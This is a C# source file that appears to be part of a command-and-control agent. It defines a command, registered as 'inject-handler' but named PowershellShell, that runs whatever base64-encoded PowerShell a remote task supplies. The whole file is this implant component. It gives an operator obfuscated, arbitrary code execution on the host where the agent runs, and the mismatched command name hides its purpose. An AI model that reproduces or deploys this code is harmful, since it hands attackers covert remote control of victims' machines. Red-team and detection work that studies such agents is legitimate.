using Agent.Models;

namespace Agent.Commands
{
    public class PowershellShell : AgentCommand
    {
        public override string Name => "inject-handler";

        public override string Execute(AgentTask task)
        {
            var args = string.Join(" ", task.Arguments);
            return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", $"-EncodedCommand {args}");
        }
    }
}
